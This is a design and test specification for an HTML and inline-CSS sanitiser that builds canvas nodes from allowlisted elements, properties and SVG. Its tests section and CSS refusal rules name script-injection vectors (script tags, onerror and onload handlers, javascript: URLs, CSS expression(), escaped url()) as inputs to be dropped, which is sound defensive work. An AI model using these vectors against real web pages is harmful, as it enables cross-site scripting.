# Task 07 — The dialect: HTML and inline CSS into nodes

**Plan:** `../2026-09-23-phase-5-design-canvas.md` · **Depends on:** 05 · **Hours:** 3

## Why

This is the first of the three lines that keep script out of the canvas (architecture rule 2), and
the reason agents can write the language they know (spec §2.2, §3.3, §7.3). `write_html` (task 16)
and paste (task 29) both come through here. Two properties matter more than any list:

1. **A write never fails silently.** Every dropped element, attribute, property and value is
   reported with a sentence the agent can act on (spec §7.3), and a write where nothing valid
   survives is `rejected-html`, not an empty success.
2. **The output is our model, never an HTML string.** The sanitiser does not clean HTML and pass it
   on; it walks the parse tree and builds `doc.Node`s from allowlisted kinds. Nothing it does not
   understand can reach a renderer.

`golang.org/x/net/html` parses (BSD-3-Clause, spec L1; the version already in the module cache, G1).
The inline-CSS tokenizer is ours (G1: `tdewolff/parse` would need a download).

## Files

- `canvas/dialect/parse.go`, `css.go`, `allowlist.go`, `svg.go`, `report.go`, `checker.go`,
  `gen.go` (`//go:generate`), `allowlist.json` (generated, committed) — new
- `canvas/dialect/*_test.go`, `testdata/*.html` — new
- `canvas/dialect/testdata/token-vectors.jsonl` — new: one JSON array `["<type>", "<value>"]` per
  line (JSON, so a control character is expressible), every one refused; read by `TestTokenValue_refusals` here and by task 23's `allowedTokenValue.test.ts`, so
  the Go and TS token checks refuse the same set (review I2)
- `canvas/dialect/testdata/token-accept.jsonl` — new, the same format, every line ACCEPTED, read by
  `TestTokenValue` here and by task 23's `allowedTokenValue.test.ts` (re-review RR-I2-1), so the
  two sides also accept the same set: `["font-weight","bold"]`, `["font-weight","650"]`,
  `["letter-spacing","normal"]`, `["letter-spacing","-0.01em"]`, `["spacing","var(--space-2)"]`,
  `["line-height","1.4"]`, `["line-height","normal"]`, `["color","#2fb3bd"]`, `["radius","8px"]`,
  `["font-family","\"Inter\", system-ui, sans-serif"]`
- `canvas/go.mod` — `require golang.org/x/net v0.26.0`; `canvas/go.sum`

## Contracts

```go
// canvas/dialect/parse.go
package dialect

const MaxHTMLBytes = 64 << 10 // spec §8.4

// AssetSink stores decoded image bytes and returns their record. The
// authority passes one backed by the store (task 10).
type AssetSink func(mediaType string, data []byte) (doc.Asset, error)

type Input struct {
	HTML   string
	NewID  func(prefix string) string          // doc.NewID in production
	Tokens map[string]doc.Token                // for unknown-token warnings
	Assets AssetSink                           // nil: every data: image is dropped
	Clone  func(nodeID string) ([]doc.Node, bool) // the subtree for <x-clone ref>, pre-order
	HasAsset func(ref string) bool             // an asset: ref must already exist
}

type Output struct {
	Roots  []string   // ids of the top-level nodes, in document order
	Nodes  []doc.Node // every node, pre-order. Roots have ParentID "" and Order ""; the caller places them
	Report Report
}

var ErrTooLarge = errors.New("dialect: html over 64 KiB")

// Parse never returns an HTML string. An Output with no Roots and a
// non-empty Report is the caller's rejected-html (spec §8.4).
func Parse(in Input) (Output, error)
```

```go
// canvas/dialect/report.go

type DropKind string

const (
	DropElement   DropKind = "element"          // a whole element and its subtree
	DropUnwrapped DropKind = "unwrapped"        // an unknown element removed, its children kept
	DropAttribute DropKind = "attribute"
	DropProperty  DropKind = "property"         // a CSS property not in the dialect
	DropValue     DropKind = "value"            // a property allowed, this value not
	DropImportant DropKind = "important"        // !important stripped, the declaration kept
	DropFlattened DropKind = "flattened-inline" // inline formatting inside text flattened (plan P5-E)
	DropRetagged  DropKind = "retagged"         // e.g. a <p> holding block elements became a <div> frame
	DropWrapped   DropKind = "wrapped-text"     // loose text beside elements wrapped in a <span> text node
	DropURL       DropKind = "url"              // a url() or src that is not an asset: or data: image
	WarnToken     DropKind = "unknown-token"    // var(--x) with no token x (a warning, the value is kept)
)

type Drop struct {
	Kind   DropKind `json:"kind"`
	What   string   `json:"what"`   // "script", "onclick", "margin", "url(https://…)" — at most 120 bytes
	Where  string   `json:"where"`  // a path from the fragment root, e.g. "div[2] > p[1]"
	Reason string   `json:"reason"` // one sentence, e.g. "margin is not in the dialect: use padding on the parent and gap"
}

type Report struct {
	Dropped  []Drop `json:"dropped"`  // [] not null
	Warnings []Drop `json:"warnings"` // [] not null
}
```

### Elements

| HTML | Becomes |
|---|---|
| `div section header footer nav main aside article ul ol li button a label` with element children | a **frame** with that tag |
| the same with only text (and inline formatting) | a **text** node with that tag (`li`, `button`, `a`, `label`) or, for the frame-only tags, a frame containing one `span` text node (report `wrapped-text`) |
| `p span h1–h6 small strong em b i code blockquote figcaption` with text | a **text** node with that tag |
| the same holding block elements | a **frame** `div` (report `retagged`) |
| `b strong i em span small code a br` **inside** a text node | flattened into the text; `br` is `"\n"` (report `flattened-inline` once per node, plan P5-E) |
| `img` | an **image**: `src` is an existing `asset:sha256-…` (`HasAsset`), or a `data:image/png|jpeg|webp|svg+xml;base64,…` decoded through `Assets` (the bytes' magic must match the type; SVG bytes are sanitised by `svg.go` first, as `SanitiseSVG("", …)`: an image document of its own, ids unprefixed). Any other `src` drops the element (`url`: *"remote images are not loaded: upload a file with canvas-upload <path> in a shell, or small bytes with upload_asset, and use its ref"*; review I12, task 16) |
| `svg` | an **svg** node: the subtree through `svg.go` as `SanitiseSVG(<the node's new id>, …)`, serialised canonically — root `xmlns` always written, well-formed XML, every kept `id` and `url(#…)` prefixed with the node id (review I8). The HTML-attribute rule below (*"ids are assigned by the canvas"*) is for HTML elements; ids inside an `<svg>` follow `svg.go`. A clone's svg nodes are re-sanitised under their new ids |
| `input` | a **frame** tagged `input` (void) with `type`, `placeholder`, `value`, `checked` kept |
| `x-clone ref="n-…"` | a deep copy of `Clone(ref)`'s subtree with new ids; its `style` is merged over the copy root's styles and its `name` over the root's name. Unknown ref: dropped (`element`) |
| `html head body` | unwrapped; `head`'s content is dropped |
| `script style iframe object embed form link meta base template noscript canvas video audio source track math frame frameset portal` | **dropped with the subtree** (`element`) |
| `table thead tbody tfoot tr td th caption colgroup col` | dropped with the subtree: *"tables are not in the dialect: use flex frames"* |
| `textarea select option` | dropped with the subtree: *"form controls other than input are not in the dialect"* |
| any other element | `unwrapped` |
| comments, doctype, processing instructions | removed, not reported |
| whitespace-only text between elements | ignored |

### Attributes

Kept: `style` (parsed below), `name` (the layer name), `aria-label`, `alt` (on `img`), and
`doc.AllowedAttrs["input"]` on `input` with `type` in `doc.AllowedInputTypes`. **Every other
attribute is dropped and reported**, with these reasons: `class` — *"classes are not in the dialect:
inline styles only"*; `id` — *"ids are assigned by the canvas"*; any `on*` — *"event handlers never
run on the canvas"*; `href` — *"links are exported as href=\"#\""*.

### Inline CSS

`css.go` tokenizes one `style` attribute (CSS Syntax Level 3's tokens, restricted: idents, numbers,
dimensions, percentages, hashes, strings, functions, commas, slashes, whitespace). A declaration is
**refused whole** (`value`) if its value contains any of: a backslash, `<`, `>`, `{`, `}`, `@`,
`expression`, `javascript:`, `behavior`, `-moz-binding`, a function not in `Functions`, or a
`url()` whose target is not an `asset:sha256-…` ref (a `data:image/…` URL is decoded into an asset
and rewritten to its ref). Property names are lowercased; `!important` is stripped and reported.
**A token's value gets these same refusals and more** (`Checker.TokenValue` below, review I2): a
token is written into ExportHTML's `<style>`, into `tokens.css` and through the renderer's
`setProperty`, none of which a declaration check guards.

```go
// canvas/dialect/allowlist.go

type Rule string

const (
	RuleKeyword Rule = "keyword" // Keywords[property] only
	RuleLength  Rule = "length"  // px % em rem, 0, auto, fit-content, min-content, max-content, calc/min/max/clamp of those, var()
	RuleColor   Rule = "color"   // hex (3,4,6,8), named, transparent, currentcolor, rgb/rgba/hsl/hsla/hwb/lab/lch/oklab/oklch/color()/color-mix(), var()
	RuleNumber  Rule = "number"
	RuleInteger Rule = "integer"
	RuleAny     Rule = "any"     // any value that passes the global checks above (composite properties)
)

// Properties is the whole dialect (spec §7.3). A property absent here is
// dropped with Reasons[property] if present, else "<p> is not in the dialect".
var Properties = map[string]Rule{
	// layout — flex, padding, absolute, size
	"display": RuleKeyword, "flex-direction": RuleKeyword, "flex-wrap": RuleKeyword, "flex-flow": RuleAny,
	"flex": RuleAny, "flex-grow": RuleNumber, "flex-shrink": RuleNumber, "flex-basis": RuleLength,
	"gap": RuleAny, "row-gap": RuleLength, "column-gap": RuleLength,
	"align-items": RuleKeyword, "align-self": RuleKeyword, "align-content": RuleKeyword, "justify-content": RuleKeyword,
	"box-sizing": RuleKeyword, "position": RuleKeyword,
	"top": RuleLength, "right": RuleLength, "bottom": RuleLength, "left": RuleLength, "inset": RuleAny, "z-index": RuleInteger,
	"width": RuleLength, "height": RuleLength, "min-width": RuleLength, "max-width": RuleLength,
	"min-height": RuleLength, "max-height": RuleLength, "aspect-ratio": RuleAny,
	"overflow": RuleKeyword, "overflow-x": RuleKeyword, "overflow-y": RuleKeyword,
	"padding": RuleAny, "padding-top": RuleLength, "padding-right": RuleLength, "padding-bottom": RuleLength,
	"padding-left": RuleLength, "padding-inline": RuleAny, "padding-block": RuleAny,
	// fills, borders, effects
	"background": RuleAny, "background-color": RuleColor, "background-image": RuleAny, "background-size": RuleAny,
	"background-position": RuleAny, "background-repeat": RuleKeyword, "background-clip": RuleKeyword,
	"-webkit-background-clip": RuleKeyword, "background-origin": RuleKeyword, "background-blend-mode": RuleKeyword,
	"opacity": RuleNumber, "mix-blend-mode": RuleKeyword, "isolation": RuleKeyword,
	"border": RuleAny, "border-width": RuleAny, "border-style": RuleKeyword, "border-color": RuleAny,
	"border-top": RuleAny, "border-right": RuleAny, "border-bottom": RuleAny, "border-left": RuleAny,
	"border-top-width": RuleLength, "border-right-width": RuleLength, "border-bottom-width": RuleLength, "border-left-width": RuleLength,
	"border-top-color": RuleColor, "border-right-color": RuleColor, "border-bottom-color": RuleColor, "border-left-color": RuleColor,
	"border-top-style": RuleKeyword, "border-right-style": RuleKeyword, "border-bottom-style": RuleKeyword, "border-left-style": RuleKeyword,
	"border-radius": RuleAny, "border-top-left-radius": RuleAny, "border-top-right-radius": RuleAny,
	"border-bottom-right-radius": RuleAny, "border-bottom-left-radius": RuleAny,
	"outline": RuleAny, "outline-width": RuleLength, "outline-style": RuleKeyword, "outline-color": RuleColor, "outline-offset": RuleLength,
	"box-shadow": RuleAny, "filter": RuleAny, "backdrop-filter": RuleAny,
	"transform": RuleAny, "transform-origin": RuleAny, "rotate": RuleAny, "scale": RuleAny, "translate": RuleAny,
	"clip-path": RuleAny, "object-fit": RuleKeyword, "object-position": RuleAny,
	"list-style": RuleAny, "list-style-type": RuleKeyword, "list-style-position": RuleKeyword,
	// typography. font-family names a family; it never loads one. The dialect has no
	// @font-face and no font asset in v1, so a family renders only if bundled or a system
	// font (plan seam S5-F.1, review M18). No property in this table loads a font file.
	"color": RuleColor, "-webkit-text-fill-color": RuleColor, "font": RuleAny, "font-family": RuleAny, "font-size": RuleLength,
	"font-weight": RuleAny, "font-style": RuleKeyword, "font-stretch": RuleAny, "font-variation-settings": RuleAny,
	"font-feature-settings": RuleAny, "font-optical-sizing": RuleKeyword, "font-variant-numeric": RuleAny,
	"font-variant-caps": RuleKeyword, "line-height": RuleAny, "letter-spacing": RuleLength, "word-spacing": RuleLength,
	"text-align": RuleKeyword, "text-transform": RuleKeyword, "text-decoration": RuleAny, "text-decoration-line": RuleAny,
	"text-decoration-color": RuleColor, "text-decoration-style": RuleKeyword, "text-decoration-thickness": RuleLength,
	"text-underline-offset": RuleLength, "text-overflow": RuleKeyword, "text-shadow": RuleAny, "text-wrap": RuleKeyword,
	"white-space": RuleKeyword, "word-break": RuleKeyword, "overflow-wrap": RuleKeyword, "hyphens": RuleKeyword,
}

// Keywords for every RuleKeyword property; "inherit", "initial" and "unset" are
// accepted for all of them.
var Keywords = map[string][]string{
	"display":        {"flex", "inline-flex", "block", "inline-block", "inline", "none"},
	"position":       {"static", "relative", "absolute"}, // fixed and sticky: Reasons
	"flex-direction": {"row", "row-reverse", "column", "column-reverse"},
	"flex-wrap":      {"nowrap", "wrap", "wrap-reverse"},
	"align-items":    {"stretch", "flex-start", "flex-end", "start", "end", "center", "baseline", "normal"},
	"align-self":     {"auto", "stretch", "flex-start", "flex-end", "start", "end", "center", "baseline", "normal"},
	"align-content":  {"stretch", "flex-start", "flex-end", "start", "end", "center", "space-between", "space-around", "space-evenly", "normal"},
	"justify-content": {"flex-start", "flex-end", "start", "end", "center", "space-between", "space-around", "space-evenly", "normal", "left", "right"},
	"box-sizing":     {"border-box", "content-box"},
	"overflow":       {"visible", "hidden", "clip", "auto", "scroll"},
	"overflow-x":     {"visible", "hidden", "clip", "auto", "scroll"},
	"overflow-y":     {"visible", "hidden", "clip", "auto", "scroll"},
	"background-repeat": {"repeat", "no-repeat", "repeat-x", "repeat-y", "space", "round"},
	"background-clip":   {"border-box", "padding-box", "content-box", "text"},
	"-webkit-background-clip": {"border-box", "padding-box", "content-box", "text"},
	"background-origin": {"border-box", "padding-box", "content-box"},
	"background-blend-mode": blendModes, "mix-blend-mode": blendModes,
	"isolation":      {"auto", "isolate"},
	"border-style":   borderStyles, "border-top-style": borderStyles, "border-right-style": borderStyles,
	"border-bottom-style": borderStyles, "border-left-style": borderStyles, "outline-style": borderStyles,
	"object-fit":     {"fill", "contain", "cover", "none", "scale-down"},
	"list-style-type": {"none", "disc", "circle", "square", "decimal", "lower-alpha", "upper-alpha", "lower-roman", "upper-roman"},
	"list-style-position": {"inside", "outside"},
	"font-style":     {"normal", "italic", "oblique"},
	"font-optical-sizing": {"auto", "none"},
	"font-variant-caps": {"normal", "small-caps", "all-small-caps", "petite-caps", "all-petite-caps", "unicase", "titling-caps"},
	"text-align":     {"left", "right", "center", "justify", "start", "end"},
	"text-transform": {"none", "uppercase", "lowercase", "capitalize"},
	"text-decoration-style": {"solid", "double", "dotted", "dashed", "wavy"},
	"text-overflow":  {"clip", "ellipsis"},
	"text-wrap":      {"wrap", "nowrap", "balance", "pretty", "stable"},
	"white-space":    {"normal", "nowrap", "pre", "pre-wrap", "pre-line", "break-spaces"},
	"word-break":     {"normal", "break-all", "keep-all", "break-word"},
	"overflow-wrap":  {"normal", "break-word", "anywhere"},
	"hyphens":        {"none", "manual", "auto"},
}

var blendModes = []string{"normal", "multiply", "screen", "overlay", "darken", "lighten", "color-dodge", "color-burn",
	"hard-light", "soft-light", "difference", "exclusion", "hue", "saturation", "color", "luminosity"}
var borderStyles = []string{"none", "hidden", "solid", "dashed", "dotted", "double", "groove", "ridge", "inset", "outset"}

// Functions is every CSS function a value may call.
var Functions = []string{
	"rgb", "rgba", "hsl", "hsla", "hwb", "lab", "lch", "oklab", "oklch", "color", "color-mix",
	"calc", "min", "max", "clamp", "var", "url",
	"linear-gradient", "radial-gradient", "conic-gradient",
	"repeating-linear-gradient", "repeating-radial-gradient", "repeating-conic-gradient",
	"blur", "brightness", "contrast", "drop-shadow", "grayscale", "hue-rotate", "invert", "opacity", "saturate", "sepia",
	"rotate", "rotatez", "scale", "scalex", "scaley", "translate", "translatex", "translatey",
	"skew", "skewx", "skewy", "matrix", "inset", "circle", "ellipse", "polygon",
}

// Reasons is the sentence for each deliberately excluded property, keyed by
// name or by prefix ending in "*".
var Reasons = map[string]string{
	"margin*":     "margin is not in the dialect: use padding on the parent and gap",
	"grid*":       "CSS Grid arrives in v2: use flex frames",
	"float":       "float is not in the dialect: use flex",
	"clear":       "clear is not in the dialect: use flex",
	"content":     "generated content is not in the dialect",
	"animation*":  "motion is not part of a design frame",
	"transition*": "motion is not part of a design frame",
	"visibility":  "use the layer's hidden flag",
	"order":       "layer order is the layer tree's: use move_nodes",
	"cursor":      "the canvas is inert: cursors are not drawn",
	"pointer-events": "the canvas is inert",
	"user-select": "the canvas is inert",
	"position:fixed":  "fixed positioning is not in the dialect: use absolute inside the artboard",
	"position:sticky": "sticky positioning is not in the dialect: use absolute inside the artboard",
}
```

```go
// canvas/dialect/svg.go

// SVGElements and SVGAttrs are the SVG subset. href and xlink:href are never
// kept (no <use>, no <image>); a url() attribute value may only be url(#id), and
// only for an id defined inside the same SVG. xmlns stays in SVGAttrs so the
// renderer's walk (task 24) keeps it, but its value is never the input's: the
// writer emits it on the root only, always as SVGNamespace (below).
const SVGNamespace = "http://www.w3.org/2000/svg"
var SVGElements = []string{"svg", "g", "path", "rect", "circle", "ellipse", "line", "polyline", "polygon",
	"text", "tspan", "defs", "linearGradient", "radialGradient", "stop", "clipPath", "mask", "title", "desc"}
var SVGAttrs = []string{"xmlns", "viewBox", "width", "height", "preserveAspectRatio", "id", "d", "x", "y",
	"x1", "y1", "x2", "y2", "cx", "cy", "r", "rx", "ry", "points", "transform", "fill", "fill-opacity",
	"fill-rule", "stroke", "stroke-width", "stroke-linecap", "stroke-linejoin", "stroke-dasharray",
	"stroke-opacity", "clip-rule", "clip-path", "mask", "opacity", "offset", "stop-color", "stop-opacity",
	"gradientUnits", "gradientTransform", "font-size", "font-family", "font-weight", "text-anchor"}

// SanitiseSVG returns canonical markup: allowlisted elements and attributes
// only, attributes sorted by name, no comments, no whitespace between tags. The
// canonical form is WELL-FORMED XML in the SVG namespace, because the renderer
// parses it with DOMParser("image/svg+xml") (task 24), where a missing xmlns puts
// every element in no namespace and draws nothing (review I8):
//   - the root is written `<svg xmlns="http://www.w3.org/2000/svg" …>` whatever
//     the input had; no other element carries xmlns. An input xmlns (root or
//     child) naming any other namespace is also reported (DropAttribute), since
//     the rewrite changes meaning; a missing one, or a child's that equals the SVG
//     namespace, is not (see Checker.SVG's line, re-review RR-M3);
//   - element and attribute names are written in SVG's case (linearGradient,
//     clipPath, viewBox, gradientUnits, preserveAspectRatio): x/net/html lowercases
//     them and restores SVG case in foreign content (x/net@v0.26.0 html/foreign.go,
//     svgTagNameAdjustments :126-153, svgAttributeAdjustments :175-217), and the
//     writer uses those names, since XML is case-sensitive;
//   - attribute values escape & < " (as &amp; &lt; &quot;), text escapes & < >,
//     and characters XML 1.0 forbids (C0 controls but tab, LF and CR) are removed
//     and reported (DropValue, one entry per SVG);
//     empty elements are written <path …/>.
// Ids are made unique per node (review I8): SVG nodes of one artboard share one
// iframe document, so two icons that each define id="paint0_linear" (Figma's
// default) would both resolve url(#paint0_linear) to the first. Every kept id is
// written "<nodeID>-<local>", where local is the input id with any leading
// "n-<12 hex>-" removed first; every url(#x) attribute value is rewritten the
// same way. So SanitiseSVG is idempotent, and re-sanitising under a new node id
// (x-clone, duplicate_nodes, a desktop duplicate) re-prefixes instead of stacking:
// SanitiseSVG(b, SanitiseSVG(a, m)) == SanitiseSVG(b, m). A local id outside
// ^[A-Za-z_][A-Za-z0-9_.-]{0,63}$ is dropped (DropAttribute, reason "an SVG id is
// a letter or _ then up to 63 of A-Z a-z 0-9 _ . -"), and so is a url(#x) whose
// x no kept id of this SVG defines (DropAttribute, reason "a url(#…) must name an
// id inside the same SVG") — no reference can reach another node's element.
// The check is TWO PASSES over the whole SVG (re-review RR-I8-1): pass 1 walks
// every element and collects the set of kept local ids; only then does pass 2
// rewrite and check each url(#x) against that set. Figma exports defs LAST
// (<path fill="url(#paint0_linear_1_2)"/> … <defs><linearGradient
// id="paint0_linear_1_2">), so a one-pass check against "ids seen so far" would
// drop every Figma reference; the defs-last vectors in TestSVG_idsPerNode and
// TestParse_twoSVGs kill that mutant. nodeID "" is
// for an SVG asset (upload_asset, an <img src="data:image/svg+xml…">, task 16),
// which renders in its own image document: ids are written as their local part
// alone — the same "n-<12 hex>-" strip runs first, so SanitiseSVG("", SanitiseSVG(a, m))
// == SanitiseSVG("", m), which is what task 08's round trip relies on (re-review
// RR-M2); xmlns and well-formedness are the same.
func SanitiseSVG(nodeID, markup string) (canonical string, report Report, err error)
```

```go
// canvas/dialect/checker.go

// Checker implements doc.Checker with this allowlist.
type Checker struct{ Tokens map[string]doc.Token } // Tokens only for warnings

func (Checker) Style(property, value string) error

// TokenValue is a token value's whole check (review I2). A token's value reaches
// three places no declaration check guards: ExportHTML's <style> element (task
// 08), tokens.css (task 09) and the renderer's setProperty on :root (task 24).
// So, in order, it refuses:
//   1. everything the "Inline CSS" global refusals refuse in a declaration value
//      (backslash, < > { } @, expression, javascript:, behavior, -moz-binding, a
//      function not in Functions), through the same css.go tokenizer;
//   2. plus ";" and "!" (a token is one value, never a second declaration or
//      !important), a comment, an unterminated string or bad-url token, and any
//      control character (U+0000–U+001F, U+007F);
//   3. plus ANY url(). Deviation from the review's "a url() must be an asset: ref",
//      declared: none of the ten token types takes an image, and an asset: ref in
//      a token would need the asset rewrite in ExportHTML's <style>, tokens.css and
//      setProperty as well — three new paths for a value no type accepts;
//   4. then the type, by TokenRules. font-family is NOT RuleAny: it is a comma
//      list of quoted strings or identifier sequences, nothing else (the review's
//      payload rode "any").
// Refusal reasons are one sentence each, surfaced by set_tokens' `dropped` (task 17).
func (Checker) TokenValue(t doc.TokenType, value string) error

// ErrUnsafeToken is what the writers that re-check tokens before output wrap
// (serialize.ExportHTML, task 08; tokens.CSS and tokens.DTCG, task 09). It lives
// here so neither package imports the other.
var ErrUnsafeToken = errors.New("dialect: a token value fails the dialect")

// ErrUnsafeNode is ExportHTML's error for a node whose stored SVG or declaration
// fails the dialect on re-check (task 08, re-review RR-M1): a replayed document is
// not re-checked on load, so the export checks it before it reaches a browser.
var ErrUnsafeNode = errors.New("dialect: a node fails the dialect")

// TokenRules is TokenValue's step 4, one rule per doc.TokenType.
var TokenRules = map[doc.TokenType]Rule{
	doc.TokenColor: RuleColor, doc.TokenRadius: RuleLength, doc.TokenSpacing: RuleLength,
	doc.TokenContainer: RuleLength, doc.TokenBreakpoint: RuleLength, doc.TokenFontSize: RuleLength,
	doc.TokenLetterSpacing: RuleLengthOrNormal, // below
	doc.TokenFontWeight:    RuleFontWeight,     // below
	doc.TokenLineHeight:    RuleNumberOrLength, // below
	doc.TokenFontFamily:    RuleFamilyList,     // below
}
// The four token-only rules. Each is its own name, so the rule name that
// allowlist.json sends to TS carries every keyword (re-review RR-I2-1): no token
// type special-cases a keyword inside TokenValue, and no declaration rule gains
// one (RuleNumber stays opacity's and flex-grow's, so "opacity: bold" stays refused;
// RuleLength stays letter-spacing's for declarations, unchanged).
const (
	RuleFamilyList     Rule = "family-list"       // ("<string>" | <ident>+) ("," …)*
	RuleNumberOrLength Rule = "number-or-length"  // a number, a RuleLength value, or normal
	RuleLengthOrNormal Rule = "length-or-normal"  // a RuleLength value, or normal
	RuleFontWeight     Rule = "font-weight"       // a number 1–1000, or normal | bold | lighter | bolder
)
// allowlist.json carries TokenRules as "tokenRules" (below), so the renderer's
// re-check (task 23 allowedTokenValue) applies the same four steps. The two
// sides are held to one set in BOTH directions by shared vectors: every line of
// testdata/token-vectors.jsonl refused, and every line of
// testdata/token-accept.jsonl accepted, by TestTokenValue here and by task 23's
// allowedTokenValue.test.ts.
// SVG refuses markup from which SanitiseSVG(nodeID, markup) would drop anything
// (a non-empty report or an error: a bypass of the parser, never silently
// repaired), and otherwise returns the canonical form, which doc stores (task 06).
// Differences that drop nothing (attribute order, the id prefix of another node
// id) are canonicalised, not refused, so a duplicate under a new id is re-prefixed
// in this one Go function rather than in each client (review I8).
// The line, for every rewrite SanitiseSVG makes (re-review RR-M3): a rewrite that
// only changes how the same SVG is SPELLED is canonicalised silently — attribute
// order, name case (lineargradient → linearGradient), a missing root xmlns, an
// xmlns on a child that equals the SVG namespace, escaping, self-closing, the id
// prefix. A rewrite that REMOVES or CHANGES meaning is a report entry, so Checker.SVG
// refuses it: a root or child xmlns naming any other namespace (DropAttribute,
// "an SVG is always in the SVG namespace"), and an XML-forbidden control character
// (DropValue, "control characters are not allowed in SVG").
func (Checker) SVG(nodeID, markup string) (canonical string, err error)

// CheckDeclaration is Style with the report entry the caller surfaces.
func CheckDeclaration(property, value string) (kept bool, drop *Drop)
```

```jsonc
// canvas/dialect/allowlist.json — generated by `go generate ./canvas/dialect`, committed. Task 23
// copies it into the editor package, and a test on each side fails if the copies differ.
{ "v": 1,
  "properties": { "display": "keyword", "…": "…" },
  "keywords": { "display": ["flex", "…"] },
  "functions": ["rgb", "…"],
  "tags": { "artboard": ["div"], "frame": ["div", "…"], "text": ["p", "…"], "image": ["img"], "svg": ["svg"] },
  "tokenRules": { "color": "color", "font-family": "family-list", "line-height": "number-or-length",
                  "letter-spacing": "length-or-normal", "font-weight": "font-weight", "…": "…" },
  "attrs": { "*": ["aria-label"], "input": ["type", "placeholder", "value", "checked"] } }
```

## Tests first

| Test | Asserts | Kills the mutant |
|---|---|---|
| `TestParse_scriptVectors` (`testdata/xss.html`: `<script>`, `<img src=x onerror>`, `<a href="javascript:">`, `<svg><script>`, `<svg onload>`, `<style>@import</style>`, `<iframe srcdoc>`, `<meta http-equiv=refresh>`, `<object>`, `<base href>`, `style="background:url(javascript:…)"`, `style="width:expression(…)"`, `style="background:url(https://x)"`, CSS escapes `\75rl(`) | no node carries any of them; every one appears in `Report.Dropped` | any single vector reaching a node |
| `TestParse_flexCard` (`testdata/card.html`, a settings card an agent would write) | the exact node list: kinds, tags, names, styles, text, pre-order | a mapping-table row implemented wrong |
| `TestParse_margin` | `margin: 8px` dropped with the margin reason; `padding: 8px` kept | the headline dialect rule |
| `TestParse_grid` | `display: grid` → `value` drop; `grid-template-columns` → `property` drop with the grid reason | grid leaking into v1 |
| `TestParse_positionFixed` | dropped with its reason; `absolute` kept | fixed allowed |
| `TestParse_important` | `color: red !important` keeps `color: red` and reports `important` | `!important` stored |
| `TestParse_inlineFlattened` | `<p>By continuing you agree to the <a>Terms</a></p>` → one text node `"By continuing you agree to the Terms"`, one `flattened-inline` | inline formatting building nested text nodes |
| `TestParse_br` | `<p>a<br>b</p>` → text `"a\nb"` | `<br>` dropped silently |
| `TestParse_dataImage` | a 1×1 PNG `data:` URL becomes an asset ref through `Assets`; a `data:image/png` whose bytes are JPEG is dropped | a sink called with unsniffed bytes |
| `TestParse_remoteImage` | `src="https://…"` drops the element with the `url` reason | a remote fetch (there is no fetcher; the test asserts the drop) |
| `TestParse_clone` | `<x-clone ref="n-…" style="background:red" name="Card 2">` copies a 5-node subtree with new ids, the root's background replaced and name set | clone sharing ids with its source |
| `TestParse_tooLarge` | 64 KiB + 1 → `ErrTooLarge` | a missing cap |
| `TestParse_nothingSurvives` | `<script>x</script>` → no roots, one drop (the caller's `rejected-html`) | an empty success |
| `TestParse_tokens` | `color: var(--brand)` with no `brand` token is kept with a `unknown-token` warning | unknown tokens refused (agents create tokens after using them) |
| `TestCSS_tokenizer` (table) | strings with `;` inside, nested functions, `url( "asset:sha256-…" )` with spaces and quotes, comments inside values | a naive `strings.Split(";")` |
| `TestSVG_sanitise` | `SanitiseSVG("n-000000000001", `<svg onload><linearGradient id="g"/><use href="#x"/><path d="M0 0" fill="url(#g)" /></svg>`)` keeps the gradient, the path and the fragment url (as `url(#n-000000000001-g)`), drops `onload` and `use`; attributes sorted | `href` kept |
| `TestSVG_namespace` | `<svg viewBox="0 0 24 24"><path d="M0 0"/></svg>` (no `xmlns`, valid inline HTML) → canonical starts `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">`; `xmlns="http://evil.example/"` on the root is replaced by the SVG namespace and reported (`attribute`); `xmlns` on a child is not written (reported only when it names another namespace); the no-`xmlns` input reports nothing; `encoding/xml`'s `Decoder` reads the output to EOF with no error and the root's `Name.Space` is `SVGNamespace` | an SVG node that draws nothing (review I8) |
| `TestSVG_case` | `<svg><lineargradient gradientunits="userSpaceOnUse"/><clippath/></svg>` → `linearGradient`, `gradientUnits`, `clipPath`, and `viewbox` → `viewBox` | a lowercased name an XML parser does not know |
| `TestSVG_wellFormed` | `<text>` content `a & b < c`, an attribute value holding `"` and `&`, and a U+0001 → `a &amp; b &lt; c`, `&quot;` and `&amp;` in the value, no U+0001 and one `value` report entry for it (the escaping reports nothing); `encoding/xml` decodes it | ill-formed XML: DOMParser yields a `parsererror` document |
| `TestSVG_idsPerNode` | the same markup with `<linearGradient id="paint0_linear">`, `<clipPath id="c">`, `<mask id="m">`, and one path with `fill="url(#paint0_linear)"`, `stroke="url(#paint0_linear)"`, `clip-path="url(#c)"`, `mask="url(#m)"` (every url-bearing attribute, not `fill` alone) under `n-000000000001` and `n-000000000002` → ids `n-000000000001-paint0_linear` and `n-000000000002-paint0_linear`, each `url()` naming its own, both outputs equal byte for byte to the two literals task 24's `svgIdsDistinct` also holds; `SanitiseSVG(b, SanitiseSVG(a, m)) == SanitiseSVG(b, m)`, `SanitiseSVG(a, SanitiseSVG(a, m)) == SanitiseSVG(a, m)` and `SanitiseSVG("", SanitiseSVG(a, m)) == SanitiseSVG("", m)`, whose ids read `paint0_linear`, `c`, `m` with no `n-` prefix (re-review RR-M2, the export round trip's comparison); plus a **defs-last** row (Figma's export order, re-review RR-I8-1): `<svg><path d="M0 0" fill="url(#paint0_linear_1_2)"/><defs><linearGradient id="paint0_linear_1_2"/></defs></svg>` under `n-000000000004` keeps the `fill` as `url(#n-000000000004-paint0_linear_1_2)` and reports nothing | two icons in one artboard sharing one gradient; a clone stacking prefixes; a one-pass `url(#…)` check that drops a reference to a later id |
| `TestSVG_danglingRef` | in an SVG that defines no `nope` and no `g`: `fill="url(#nope)"`, and `fill="url(#n-000000000009-g)"` naming another node's id, and `id="1bad"` → the two refs and the id each dropped as `attribute`, with the reasons `svg.go` names | one node's SVG reaching another node's element |
| `TestParse_twoSVGs` | an artboard's HTML with two Figma-style icons, both `id="paint0_linear"`, each in Figma's **defs-last** order (the `<path fill="url(#paint0_linear)">` first, the `<defs><linearGradient id="paint0_linear">` last) → two svg nodes whose canonical markup shares no id (every `id="…"` value across both is distinct), each `fill` names its own node's gradient, and the parse report is empty | the review I8 scenario end to end in Go; a one-pass `url(#…)` check (re-review RR-I8-1) |
